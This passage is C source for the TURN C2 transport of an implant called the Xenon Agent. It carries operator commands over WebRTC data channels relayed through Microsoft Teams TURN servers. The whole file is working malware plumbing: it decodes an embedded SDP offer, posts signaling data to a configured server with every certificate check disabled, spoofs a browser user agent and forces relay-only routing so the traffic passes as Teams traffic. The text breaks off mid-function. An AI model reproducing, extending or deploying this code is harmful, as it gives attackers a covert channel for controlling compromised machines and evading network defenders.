/*
 * TransportTurn.c - TURN C2 Transport for Xenon Agent
 *
 * Implements WebRTC data channel communication through Microsoft Teams
 * TURN relay servers using libdatachannel.
 *
 * Pattern: Egress (like HTTPX) - NetworkTurnSend() does send+receive atomically.
 */

#include "Xenon.h"
#include "Config.h"
#include "Package.h"
#include "TransportTurn.h"
#include "Sleep.h"

#ifdef TURNC2_TRANSPORT

#include <rtc/rtc.h>
#include <winsock2.h>
#include <wininet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "cJSON.h"

/* ------------------------------------------------------------------ */
/*  Constants                                                          */
/* ------------------------------------------------------------------ */
#define TURN_MAX_CHUNK_SIZE     60000   /* under SCTP 65536 limit      */
#define TURN_RECV_TIMEOUT_MS    60000   /* 60 sec receive timeout       */
#define TURN_SIGNAL_TIMEOUT_MS  30000   /* 30 sec signaling timeout     */
#define TURN_DC_OPEN_TIMEOUT_MS 30000   /* 30 sec data channel open     */
#define TURN_USER_AGENT         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

/* ------------------------------------------------------------------ */
/*  Global State (file-scope)                                          */
/* ------------------------------------------------------------------ */
static BOOL              gTurnInitialized  = FALSE;
static int               gPeerConnection   = -1;
static int               gDataChannel      = -1;
static volatile BOOL     gDataChannelOpen  = FALSE;
static HANDLE            gTurnMutex        = NULL;

/* Receive buffer (populated by data channel callback) */
static PBYTE             gRecvBuffer       = NULL;
static SIZE_T            gRecvBufferLen    = 0;
static SIZE_T            gRecvExpectedLen  = 0;
static CRITICAL_SECTION  gRecvCS;
static HANDLE            gRecvEvent        = NULL;  /* signaled when full msg received */

/* Complete message output slot */
static PBYTE             gRecvMsg          = NULL;
static SIZE_T            gRecvMsgLen       = 0;

/* Data channel open event */
static HANDLE            gDCOpenEvent      = NULL;

/* Connection state tracking */
static volatile BOOL     gConnectionFailed = FALSE;

/* ICE gathering complete event */
static HANDLE            gGatheringCompleteEvent = NULL;

/* Parsed offer fields (extracted once from sdpOffer) */
static PCHAR             gOfferSDP         = NULL;
static PCHAR             gOfferID          = NULL;


/* ------------------------------------------------------------------ */
/*  Forward Declarations                                               */
/* ------------------------------------------------------------------ */
static BOOL   TurnSendChunked(PBYTE data, SIZE_T len);
static BOOL   TurnRecvBlocking(PBYTE* ppOutData, SIZE_T* pOutLen, DWORD timeoutMs);
static BOOL   TurnSendSignalingPost(PCHAR offerID, PCHAR relayAddr, int relayPort,
                                     PCHAR iceUfrag, PCHAR icePwd, PCHAR fingerprint,
                                     /* out */ PCHAR* outStatus,
                                     /* out */ PCHAR* outServerRelayAddr, int* outServerRelayPort,
                                     /* out */ PCHAR* outServerICEUfrag, PCHAR* outServerICEPwd,
                                     /* out */ PCHAR* outServerFingerprint);
static BOOL   TurnDecodeOffer(void);
static BOOL   TurnSetupPeerConnection(PCHAR offerSDP);
static PCHAR  TurnBuildSyntheticOffer(PCHAR iceUfrag, PCHAR icePwd, PCHAR fingerprint);
static PCHAR  TurnExtractRelayAddr(const char* sdp, int* outPort);
static PCHAR  TurnExtractICEUfrag(const char* sdp);
static PCHAR  TurnExtractICEPwd(const char* sdp);
static PCHAR  TurnExtractFingerprint(const char* sdp);
static void   TurnCleanupConnection(void);


/* ------------------------------------------------------------------ */
/*  Base64 Decode (minimal, for SDP offer)                             */
/* ------------------------------------------------------------------ */
static const unsigned char b64_table[256] = {
    64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,
    64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,
    64,64,64,64,64,64,64,64,64,64,64,62,64,64,64,63,
    52,53,54,55,56,57,58,59,60,61,64,64,64,65,64,64,
    64, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9,10,11,12,13,14,
    15,16,17,18,19,20,21,22,23,24,25,64,64,64,64,64,
    64,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,
    41,42,43,44,45,46,47,48,49,50,51,64,64,64,64,64,
    64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,
    64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,
    64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,
    64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,
    64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,
    64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,
    64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,
    64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,64
};

static PBYTE Base64Decode(const char* input, SIZE_T* outLen) {
    SIZE_T inLen = strlen(input);
    if (inLen % 4 != 0) return NULL;

    SIZE_T outputLen = inLen / 4 * 3;
    if (input[inLen - 1] == '=') outputLen--;
    if (input[inLen - 2] == '=') outputLen--;

    PBYTE output = (PBYTE)LocalAlloc(LPTR, outputLen + 1);
    if (!output) return NULL;

    SIZE_T j = 0;
    for (SIZE_T i = 0; i < inLen;) {
        UINT32 a = b64_table[(unsigned char)input[i++]];
        UINT32 b = b64_table[(unsigned char)input[i++]];
        UINT32 c = b64_table[(unsigned char)input[i++]];
        UINT32 d = b64_table[(unsigned char)input[i++]];

        UINT32 triple = (a << 18) | (b << 12) | (c << 6) | d;

        if (j < outputLen) output[j++] = (triple >> 16) & 0xFF;
        if (j < outputLen) output[j++] = (triple >> 8) & 0xFF;
        if (j < outputLen) output[j++] = triple & 0xFF;
    }

    *outLen = outputLen;
    output[outputLen] = '\0';
    return output;
}


/* ------------------------------------------------------------------ */
/*  libdatachannel Callbacks                                           */
/* ------------------------------------------------------------------ */

static void RTC_API onDataChannelOpen(int dc, void* ptr) {
    (void)ptr;
    _dbg("[TURN] Data channel %d open", dc);
    gDataChannel = dc;
    gDataChannelOpen = TRUE;
    SetEvent(gDCOpenEvent);
}

static void RTC_API onDataChannelMessage(int dc, const char* message, int size, void* ptr) {
    (void)dc;
    (void)ptr;

    if (size < 0) {
        /* String message — shouldn't happen for binary data channel */
        size = (int)strlen(message);
    }

    const BYTE* data = (const BYTE*)message;

    EnterCriticalSection(&gRecvCS);

    if (gRecvExpectedLen == 0) {
        /* First chunk: read 4-byte big-endian length prefix */
        if (size < 4) {
            _dbg("[TURN] recv chunk too small for length prefix: %d bytes", size);
            LeaveCriticalSection(&gRecvCS);
            return;
        }
        gRecvExpectedLen = ((SIZE_T)data[0] << 24) | ((SIZE_T)data[1] << 16) |
                           ((SIZE_T)data[2] << 8)  | (SIZE_T)data[3];
        gRecvBuffer = (PBYTE)LocalAlloc(LPTR, gRecvExpectedLen);
        gRecvBufferLen = 0;
        data += 4;
        size -= 4;
    }

    if (size > 0 && gRecvBuffer) {
        SIZE_T toCopy = (SIZE_T)size;
        if (gRecvBufferLen + toCopy > gRecvExpectedLen) {
            toCopy = gRecvExpectedLen - gRecvBufferLen;
        }
        memcpy(gRecvBuffer + gRecvBufferLen, data, toCopy);
        gRecvBufferLen += toCopy;
    }

    if (gRecvBufferLen >= gRecvExpectedLen && gRecvExpectedLen > 0) {
        /* Complete message received — move to output slot */
        gRecvMsg = gRecvBuffer;
        gRecvMsgLen = gRecvExpectedLen;
        gRecvBuffer = NULL;
        gRecvExpectedLen = 0;
        gRecvBufferLen = 0;
        LeaveCriticalSection(&gRecvCS);
        SetEvent(gRecvEvent);
        return;
    }

    LeaveCriticalSection(&gRecvCS);
}

static void RTC_API onDataChannelClosed(int dc, void* ptr) {
    (void)dc;
    (void)ptr;
    _dbg("[TURN] Data channel closed");
    gDataChannelOpen = FALSE;
}

static void RTC_API onPeerConnectionDataChannel(int pc, int dc, void* ptr) {
    (void)pc;
    (void)ptr;
    _dbg("[TURN] Peer connection received data channel %d", dc);
    gDataChannel = dc;

    rtcSetOpenCallback(dc, onDataChannelOpen);
    rtcSetMessageCallback(dc, onDataChannelMessage);
    rtcSetClosedCallback(dc, onDataChannelClosed);
}

static void RTC_API onPeerConnectionStateChange(int pc, rtcState state, void* ptr) {
    (void)pc;
    (void)ptr;
    _dbg("[TURN] Peer connection state: %d", state);

    if (state == RTC_FAILED || state == RTC_CLOSED) {
        gConnectionFailed = TRUE;
        gDataChannelOpen = FALSE;
        /* Signal recv to unblock so caller can detect failure */
        SetEvent(gRecvEvent);
    }
}

static void RTC_API onPeerConnectionGatheringStateChange(int pc, rtcGatheringState state, void* ptr) {
    (void)pc;
    (void)ptr;
    _dbg("[TURN] ICE gathering state: %d", state);
    if (state == RTC_GATHERING_COMPLETE) {
        SetEvent(gGatheringCompleteEvent);
    }
}


/* ------------------------------------------------------------------ */
/*  TurnInit - One-time initialization                                 */
/* ------------------------------------------------------------------ */
BOOL TurnInit(void) {
    if (gTurnInitialized)
        return TRUE;

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        _err("[TURN] WSAStartup failed");
        return FALSE;
    }

    InitializeCriticalSection(&gRecvCS);
    gRecvEvent              = CreateEventA(NULL, TRUE, FALSE, NULL);   /* manual-reset */
    gDCOpenEvent            = CreateEventA(NULL, TRUE, FALSE, NULL);   /* manual-reset */
    gGatheringCompleteEvent = CreateEventA(NULL, TRUE, FALSE, NULL);   /* manual-reset */
    gTurnMutex              = CreateMutexA(NULL, FALSE, NULL);

    if (!gRecvEvent || !gDCOpenEvent || !gGatheringCompleteEvent || !gTurnMutex) {
        _err("[TURN] Failed to create sync objects");
        return FALSE;
    }

    /* Initialize libdatachannel logging */
    rtcInitLogger(RTC_LOG_WARNING, NULL);

    gTurnInitialized = TRUE;
    _dbg("[TURN] Initialized");
    return TRUE;
}


/* ------------------------------------------------------------------ */
/*  SDP Parsing Helpers                                                */
/* ------------------------------------------------------------------ */

/*
 * Extract first relay candidate address from SDP.
 * Looks for lines like: a=candidate:... typ relay ...
 * Pattern: a=candidate:<foundation> <component> <proto> <priority> <addr> <port> typ relay
 */
static PCHAR TurnExtractRelayAddr(const char* sdp, int* outPort) {
    *outPort = 0;
    const char* pos = sdp;

    while ((pos = strstr(pos, "typ relay")) != NULL) {
        /* Walk backward to find the candidate line start */
        const char* lineStart = pos;
        while (lineStart > sdp && *(lineStart - 1) != '\n')
            lineStart--;

        /* Parse: a=candidate:<f> <comp> <proto> <pri> <addr> <port> typ relay */
        if (strncmp(lineStart, "a=candidate:", 12) == 0) {
            const char* p = lineStart + 12;
            /* Skip foundation */
            while (*p && *p != ' ') p++;
            if (*p == ' ') p++;
            /* Skip component */
            while (*p && *p != ' ') p++;
            if (*p == ' ') p++;
            /* Skip protocol */
            while (*p && *p != ' ') p++;
            if (*p == ' ') p++;
            /* Skip priority */
            while (*p && *p != ' ') p++;
            if (*p == ' ') p++;
            /* Extract address */
            const char* addrStart = p;
            while (*p && *p != ' ') p++;
            SIZE_T addrLen = p - addrStart;
            /* Extract port */
            if (*p == ' ') p++;
            int port = atoi(p);

            PCHAR addr = (PCHAR)LocalAlloc(LPTR, addrLen + 1);
            if (addr) {
                memcpy(addr, addrStart, addrLen);
                addr[addrLen] = '\0';
                *outPort = port;
                return addr;
            }
        }
        pos++;
    }
    return NULL;
}

static PCHAR TurnExtractICEUfrag(const char* sdp) {
    const char* prefix = "a=ice-ufrag:";
    const char* pos = strstr(sdp, prefix);
    if (!pos) return NULL;
    pos += strlen(prefix);
    const char* end = pos;
    while (*end && *end != '\r' && *end != '\n') end++;
    SIZE_T len = end - pos;
    PCHAR result = (PCHAR)LocalAlloc(LPTR, len + 1);
    if (result) {
        memcpy(result, pos, len);
        result[len] = '\0';
    }
    return result;
}

static PCHAR TurnExtractICEPwd(const char* sdp) {
    const char* prefix = "a=ice-pwd:";
    const char* pos = strstr(sdp, prefix);
    if (!pos) return NULL;
    pos += strlen(prefix);
    const char* end = pos;
    while (*end && *end != '\r' && *end != '\n') end++;
    SIZE_T len = end - pos;
    PCHAR result = (PCHAR)LocalAlloc(LPTR, len + 1);
    if (result) {
        memcpy(result, pos, len);
        result[len] = '\0';
    }
    return result;
}

static PCHAR TurnExtractFingerprint(const char* sdp) {
    const char* prefix = "a=fingerprint:";
    const char* pos = strstr(sdp, prefix);
    if (!pos) return NULL;
    pos += strlen(prefix);
    const char* end = pos;
    while (*end && *end != '\r' && *end != '\n') end++;
    SIZE_T len = end - pos;
    PCHAR result = (PCHAR)LocalAlloc(LPTR, len + 1);
    if (result) {
        memcpy(result, pos, len);
        result[len] = '\0';
    }
    return result;
}


/* ------------------------------------------------------------------ */
/*  Build Synthetic Offer SDP (for reconnect)                          */
/* ------------------------------------------------------------------ */
static PCHAR TurnBuildSyntheticOffer(PCHAR iceUfrag, PCHAR icePwd, PCHAR fingerprint) {
    /* Build minimal SDP offer with server's new ICE/DTLS params */
    SIZE_T totalLen = 512 + strlen(iceUfrag) + strlen(icePwd) + strlen(fingerprint);
    PCHAR sdp = (PCHAR)LocalAlloc(LPTR, totalLen);
    if (!sdp) return NULL;

    _snprintf(sdp, totalLen,
        "v=0\r\n"
        "o=- 0 0 IN IP4 0.0.0.0\r\n"
        "s=-\r\n"
        "t=0 0\r\n"
        "a=group:BUNDLE 0\r\n"
        "a=msid-semantic: WMS\r\n"
        "m=application 9 UDP/DTLS/SCTP webrtc-datachannel\r\n"
        "c=IN IP4 0.0.0.0\r\n"
        "a=mid:0\r\n"
        "a=ice-ufrag:%s\r\n"
        "a=ice-pwd:%s\r\n"
        "a=fingerprint:%s\r\n"
        "a=setup:actpass\r\n"
        "a=sctp-port:5000\r\n",
        iceUfrag, icePwd, fingerprint);

    return sdp;
}


/* ------------------------------------------------------------------ */
/*  Decode Embedded SDP Offer                                          */
/* ------------------------------------------------------------------ */
static BOOL TurnDecodeOffer(void) {
    if (gOfferSDP && gOfferID) {
        return TRUE; /* Already decoded */
    }

    if (!xenonConfig->sdpOffer || strlen(xenonConfig->sdpOffer) == 0) {
        _err("[TURN] No SDP offer configured");
        return FALSE;
    }

    /* Base64 decode the SDP offer (builder already removed brotli) */
    SIZE_T decodedLen = 0;
    PBYTE decoded = Base64Decode(xenonConfig->sdpOffer, &decodedLen);
    if (!decoded) {
        _err("[TURN] Failed to base64 decode SDP offer");
        return FALSE;
    }

    _dbg("[TURN] Decoded SDP offer: %d bytes", (int)decodedLen);

    /* Parse JSON: { "offer_id": "...", "offer_sdp": "...", "ice_servers": [...] } */
    cJSON* root = cJSON_ParseWithLength((const char*)decoded, decodedLen);
    if (!root) {
        _err("[TURN] Failed to parse SDP offer JSON");
        LocalFree(decoded);
        return FALSE;
    }

    cJSON* offerId = cJSON_GetObjectItemCaseSensitive(root, "offer_id");
    cJSON* offerSdp = cJSON_GetObjectItemCaseSensitive(root, "offer_sdp");

    if (!cJSON_IsString(offerId) || !cJSON_IsString(offerSdp)) {
        _err("[TURN] SDP offer JSON missing offer_id or offer_sdp");
        cJSON_Delete(root);
        LocalFree(decoded);
        return FALSE;
    }

    SIZE_T idLen = strlen(offerId->valuestring);
    gOfferID = (PCHAR)LocalAlloc(LPTR, idLen + 1);
    strcpy(gOfferID, offerId->valuestring);

    SIZE_T sdpLen = strlen(offerSdp->valuestring);
    gOfferSDP = (PCHAR)LocalAlloc(LPTR, sdpLen + 1);
    strcpy(gOfferSDP, offerSdp->valuestring);

    xenonConfig->offerId = gOfferID;

    _dbg("[TURN] offer_id=%s, offer SDP length=%d", gOfferID, (int)sdpLen);

    cJSON_Delete(root);
    LocalFree(decoded);
    return TRUE;
}


/* ------------------------------------------------------------------ */
/*  Signaling POST via WinINet                                         */
/* ------------------------------------------------------------------ */
static BOOL TurnSendSignalingPost(
    PCHAR offerID, PCHAR relayAddr, int relayPort,
    PCHAR iceUfrag, PCHAR icePwd, PCHAR fingerprint,
    PCHAR* outStatus,
    PCHAR* outServerRelayAddr, int* outServerRelayPort,
    PCHAR* outServerICEUfrag, PCHAR* outServerICEPwd,
    PCHAR* outServerFingerprint)
{
    *outStatus = NULL;
    *outServerRelayAddr = NULL;
    *outServerRelayPort = 0;
    *outServerICEUfrag = NULL;
    *outServerICEPwd = NULL;
    *outServerFingerprint = NULL;

    /* Build JSON body */
    cJSON* body = cJSON_CreateObject();
    cJSON_AddStringToObject(body, "offer_id", offerID);
    cJSON_AddStringToObject(body, "relay_addr", relayAddr);
    cJSON_AddNumberToObject(body, "relay_port", relayPort);
    cJSON_AddStringToObject(body, "ice_ufrag", iceUfrag);
    cJSON_AddStringToObject(body, "ice_pwd", icePwd);
    cJSON_AddStringToObject(body, "fingerprint", fingerprint);
    char* bodyStr = cJSON_PrintUnformatted(body);
    cJSON_Delete(body);

    if (!bodyStr) {
        _err("[TURN] Failed to build signaling JSON");
        return FALSE;
    }

    SIZE_T bodyLen = strlen(bodyStr);
    _dbg("[TURN] POST signaling: %s (%d bytes)", bodyStr, (int)bodyLen);

    /* Build URL */
    PCHAR signalHost = xenonConfig->signalUrl;
    UINT32 signalPort = xenonConfig->signalPort;
    PCHAR signalUri = xenonConfig->signalUri;
    BOOL useSSL = xenonConfig->signalSSL;

    HINTERNET hInternet = InternetOpenA(TURN_USER_AGENT, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        _err("[TURN] InternetOpen failed: %d", GetLastError());
        free(bodyStr);
        return FALSE;
    }

    DWORD flags = INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_UI;
    if (useSSL) {
        flags |= INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;
    }

    HINTERNET hConnect = InternetConnectA(hInternet, signalHost, (INTERNET_PORT)signalPort,
                                           NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        _err("[TURN] InternetConnect failed: %d", GetLastError());
        InternetCloseHandle(hInternet);
        free(bodyStr);
        return FALSE;
    }

    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", signalUri, NULL, NULL, NULL, flags, 0);
    if (!hRequest) {
        _err("[TURN] HttpOpenRequest failed: %d", GetLastError());
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        free(bodyStr);
        return FALSE;
    }

    /* Set security flags to accept any cert */
    if (useSSL) {
        DWORD secFlags = 0;
        DWORD secFlagsSize = sizeof(secFlags);
        InternetQueryOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &secFlags, &secFlagsSize);
        secFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                     SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_REVOCATION;
        InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));
    }

    LPCSTR headers = "Content-Type: application/json\r\n";
    BOOL sent = HttpSendRequestA(hRequest, headers, -1, bodyStr, (DWORD)bodyLen);
    free(bodyStr);

    if (!sent) {
        _err("[TURN] HttpSendRequest failed: %d", GetLastError());
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    /* Read response */
    DWORD statusCode = 0;
    DWORD statusSize = sizeof(statusCode);
    HttpQueryInfoA(hRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &statusCode, &statusSize, NULL);
    _dbg("[TURN] Signaling response status: %d", statusCode);

    BYTE respBuf[4096] = { 0 };
    DWORD bytesRead = 0;
    DWORD totalRead = 0;
    while (InternetReadFile(hRequest, respBuf + totalRead, sizeof(respBuf) - totalRead - 1, &bytesRead) && bytesRead > 0) {
        totalRead += bytesRead;
        if (totalRead >= sizeof(respBuf) - 1) break;
    }
    respBuf[totalRead] = '\0';

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    if (statusCode != 200) {
        _err("[TURN] Signaling server returned %d: %s", statusCode, respBuf);
        return FALSE;
    }

    _dbg("[TURN] Signaling response: %s", respBuf);

    /* Parse JSON response */
    cJSON* resp = cJSON_ParseWithLength((const char*)respBuf, totalRead);
    if (!resp) {
        _err("[TURN] Failed to parse signaling response JSON");
        return FALSE;
    }

    cJSON* status = cJSON_GetObjectItemCaseSensitive(resp, "status");
    if (cJSON_IsString(status)) {
        SIZE_T sLen = strlen(status->valuestring);
        *outStatus = (PCHAR)LocalAlloc(LPTR, sLen + 1);
        strcpy(*outStatus, status->valuestring);
    }

    cJSON* sra = cJSON_GetObjectItemCaseSensitive(resp, "server_relay_addr");
    if (cJSON_IsString(sra)) {
        SIZE_T len = strlen(sra->valuestring);
        *outServerRelayAddr = (PCHAR)LocalAlloc(LPTR, len + 1);
        strcpy(*outServerRelayAddr, sra->valuestring);
    }

    cJSON* srp = cJSON_GetObjectItemCaseSensitive(resp, "server_relay_port");
    if (cJSON_IsNumber(srp)) {
        *outServerRelayPort = srp->valueint;
    }

    cJSON* suf = cJSON_GetObjectItemCaseSensitive(resp, "server_ice_ufrag");
    if (cJSON_IsString(suf)) {
        SIZE_T len = strlen(suf->valuestring);
        *outServerICEUfrag = (PCHAR)LocalAlloc(LPTR, len + 1);
        strcpy(*outServerICEUfrag, suf->valuestring);
    }

    cJSON* spw = cJSON_GetObjectItemCaseSensitive(resp, "server_ice_pwd");
    if (cJSON_IsString(spw)) {
        SIZE_T len = strlen(spw->valuestring);
        *outServerICEPwd = (PCHAR)LocalAlloc(LPTR, len + 1);
        strcpy(*outServerICEPwd, spw->valuestring);
    }

    cJSON* sfp = cJSON_GetObjectItemCaseSensitive(resp, "server_fingerprint");
    if (cJSON_IsString(sfp)) {
        SIZE_T len = strlen(sfp->valuestring);
        *outServerFingerprint = (PCHAR)LocalAlloc(LPTR, len + 1);
        strcpy(*outServerFingerprint, sfp->valuestring);
    }

    cJSON_Delete(resp);
    return TRUE;
}


/* ------------------------------------------------------------------ */
/*  Cleanup existing connection                                        */
/* ------------------------------------------------------------------ */
static void TurnCleanupConnection(void) {
    if (gDataChannel >= 0) {
        rtcClose(gDataChannel);
        rtcDelete(gDataChannel);
        gDataChannel = -1;
    }
    if (gPeerConnection >= 0) {
        rtcClosePeerConnection(gPeerConnection);
        rtcDeletePeerConnection(gPeerConnection);
        gPeerConnection = -1;
    }
    gDataChannelOpen = FALSE;
    gConnectionFailed = FALSE;

    EnterCriticalSection(&gRecvCS);
    if (gRecvBuffer) {
        LocalFree(gRecvBuffer);
        gRecvBuffer = NULL;
    }
    gRecvBufferLen = 0;
    gRecvExpectedLen = 0;
    if (gRecvMsg) {
        LocalFree(gRecvMsg);
        gRecvMsg = NULL;
    }
    gRecvMsgLen = 0;
    LeaveCriticalSection(&gRecvCS);

    ResetEvent(gRecvEvent);
    ResetEvent(gDCOpenEvent);
    ResetEvent(gGatheringCompleteEvent);
}


/* ------------------------------------------------------------------ */
/*  Setup PeerConnection with given offer SDP                          */
/* ------------------------------------------------------------------ */
static BOOL TurnSetupPeerConnection(PCHAR offerSDP) {
    rtcConfiguration config;
    memset(&config, 0, sizeof(config));

    /* Build TURN server URL with embedded credentials.
     * libdatachannel format: "turns:username:password@host:port?transport=tcp"
     * Input turnServer is like: "turns:worldaz.relay.teams.microsoft.com:443?transport=tcp"
     * We need to inject "username:password@" after the "turns:" prefix. */
    char turnUrlWithCreds[1024] = { 0 };
    const char* turnUrl = xenonConfig->turnServer;
    const char* turnUser = xenonConfig->turnUsername;
    const char* turnPass = xenonConfig->turnPassword;

    /* Find the scheme separator (first ":" or "://") */
    const char* schemeEnd = strstr(turnUrl, "://");
    if (schemeEnd) {
        SIZE_T schemeLen = (schemeEnd - turnUrl) + 3;  /* include "://" */
        _snprintf(turnUrlWithCreds, sizeof(turnUrlWithCreds),
                  "%.*s%s:%s@%s",
                  (int)schemeLen, turnUrl, turnUser, turnPass, turnUrl + schemeLen);
    } else {
        /* Format: "turns:host..." - insert after "turns:" or "turn:" */
        const char* colonPos = strchr(turnUrl, ':');
        if (colonPos) {
            SIZE_T prefixLen = (colonPos - turnUrl) + 1;  /* include ":" */
            _snprintf(turnUrlWithCreds, sizeof(turnUrlWithCreds),
                      "%.*s%s:%s@%s",
                      (int)prefixLen, turnUrl, turnUser, turnPass, turnUrl + prefixLen);
        } else {
            /* Fallback: just use as-is */
            strncpy(turnUrlWithCreds, turnUrl, sizeof(turnUrlWithCreds) - 1);
        }
    }

    const char* iceServers[1];
    iceServers[0] = turnUrlWithCreds;
    config.iceServers = iceServers;
    config.iceServersCount = 1;

    /* Force relay-only ICE transport */
    config.iceTransportPolicy = RTC_TRANSPORT_POLICY_RELAY;

    _dbg("[TURN] Creating peer connection with TURN: %s", turnUrlWithCreds);

    gPeerConnection = rtcCreatePeerConnection(&config);
    if (gPeerConnection < 0) {
        _err("[TURN] Failed to create peer connection: %d", gPeerConnection);
        return FALSE;
    }

    /* Set callbacks */
    rtcSetStateChangeCallback(gPeerConnection, onPeerConnectionStateChange);
    rtcSetGatheringStateChangeCallback(gPeerConnection, onPeerConnectionGatheringStateChange);
    rtcSetDataChannelCallback(gPeerConnection, onPeerConnectionDataChannel);

    /* Reset state */
    gDataChannelOpen = FALSE;
    gConnectionFailed = FALSE;
    ResetEvent(gDCOpenEvent);
    ResetEvent(gRecvEvent);
    ResetEvent(gGatheringCompleteEvent);

    EnterCriticalSection(&gRecvCS);
    if (gRecvBuffer) { LocalFree(gRecvBuffer); gRecvBuffer = NULL; }
    gRecvBufferLen = 0;
    gRecvExpectedLen = 0;
    if (gRecvMsg) { LocalFree(gRecvMsg); gRecvMsg = NULL; }
    gRecvMsgLen = 0;
    LeaveCriticalSection(&gRecvCS);

    /* Set the server's offer as remote description */
    _dbg("[TURN] Setting remote description (server offer)");
    int ret = rtcSetRemoteDescription(gPeerConnection, offerSDP, "offer");
    if (ret < 0) {
        _err("[TURN] Failed to set remote description: %d", ret);
        return FALSE;
    }

    return TRUE;
}


/* ------------------------------------------------------------------ */
/*  TurnEstablishWebRTC                                                */
/* ------------------------------------------------------------------ */
BOOL TurnEstablishWebRTC(void) {
    /* Decode the embedded SDP offer (first time) */
    if (!TurnDecodeOffer()) {
        return FALSE;
    }

    /* Set up peer connection with the server's offer */
    if (!TurnSetupPeerConnection(gOfferSDP)) {
        return FALSE;
    }

    /* Wait for ICE gathering to complete via callback event */
    _dbg("[TURN] Waiting for ICE gathering...");
    ResetEvent(gGatheringCompleteEvent);
    DWORD gatherWait = WaitForSingleObject(gGatheringCompleteEvent, 30000);
    if (gatherWait != WAIT_OBJECT_0) {
        _err("[TURN] ICE gathering timed out");
        return FALSE;
    }
    _dbg("[TURN] ICE gathering complete");

    /* Get local description (answer with candidates) */
    char localSDP[8192] = { 0 };
    int sdpLen = rtcGetLocalDescription(gPeerConnection, localSDP, sizeof(localSDP));
    if (sdpLen < 0) {
        _err("[TURN] Failed to get local description: %d", sdpLen);
        return FALSE;
    }
    _dbg("[TURN] Local SDP (%d bytes)", sdpLen);

    /* Extract relay candidate from local SDP */
    int relayPort = 0;
    PCHAR relayAddr = TurnExtractRelayAddr(localSDP, &relayPort);
    if (!relayAddr || relayPort == 0) {
        _err("[TURN] No relay candidate found in local SDP");
        return FALSE;
    }

    PCHAR iceUfrag = TurnExtractICEUfrag(localSDP);
    PCHAR icePwd = TurnExtractICEPwd(localSDP);
    PCHAR fingerprint = TurnExtractFingerprint(localSDP);

    if (!iceUfrag || !icePwd || !fingerprint) {
        _err("[TURN] Missing ICE credentials or fingerprint in local SDP");
        if (relayAddr) LocalFree(relayAddr);
        if (iceUfrag) LocalFree(iceUfrag);
        if (icePwd) LocalFree(icePwd);
        if (fingerprint) LocalFree(fingerprint);
        return FALSE;
    }

    _dbg("[TURN] Minimal answer: relay=%s:%d ufrag=%s fingerprint=%s",
         relayAddr, relayPort, iceUfrag, fingerprint);

    /* Send MinimalAnswer to signaling server */
    PCHAR sigStatus = NULL;
    PCHAR serverRelayAddr = NULL;
    int serverRelayPort = 0;
    PCHAR serverICEUfrag = NULL;
    PCHAR serverICEPwd = NULL;
    PCHAR serverFingerprint = NULL;

    BOOL sigOk = TurnSendSignalingPost(
        gOfferID, relayAddr, relayPort, iceUfrag, icePwd, fingerprint,
        &sigStatus, &serverRelayAddr, &serverRelayPort,
        &serverICEUfrag, &serverICEPwd, &serverFingerprint);

    LocalFree(relayAddr);
    LocalFree(iceUfrag);
    LocalFree(icePwd);
    LocalFree(fingerprint);

    if (!sigOk || !sigStatus) {
        _err("[TURN] Signaling POST failed");
        return FALSE;
    }

    /* Handle reconnect response */
    if (strcmp(sigStatus, "reconnect") == 0 && serverICEUfrag) {
        _dbg("[TURN] Reconnect: server has new ICE creds (ufrag=%s, relay=%s:%d)",
             serverICEUfrag, serverRelayAddr ? serverRelayAddr : "?", serverRelayPort);

        /* Tear down current PC */
        TurnCleanupConnection();

        /* Build synthetic offer from server's new params */
        PCHAR syntheticOffer = TurnBuildSyntheticOffer(serverICEUfrag, serverICEPwd, serverFingerprint);
        if (!syntheticOffer) {
            _err("[TURN] Failed to build synthetic offer");
            goto cleanup_sig;
        }

        _dbg("[TURN] Setting up PC with synthetic offer");

        /* Create new PC with synthetic offer */
        if (!TurnSetupPeerConnection(syntheticOffer)) {
            _err("[TURN] Failed to set up PC with synthetic offer");
            LocalFree(syntheticOffer);
            goto cleanup_sig;
        }
        LocalFree(syntheticOffer);

        /* Trickle server's relay candidate */
        char candidateStr[256] = { 0 };
        _snprintf(candidateStr, sizeof(candidateStr),
                  "candidate:1 1 udp 16777215 %s %d typ relay raddr 0.0.0.0 rport 0",
                  serverRelayAddr, serverRelayPort);

        rtcAddRemoteCandidate(gPeerConnection, candidateStr, "0");

        /* Wait for ICE gathering on new PC */
        ResetEvent(gGatheringCompleteEvent);
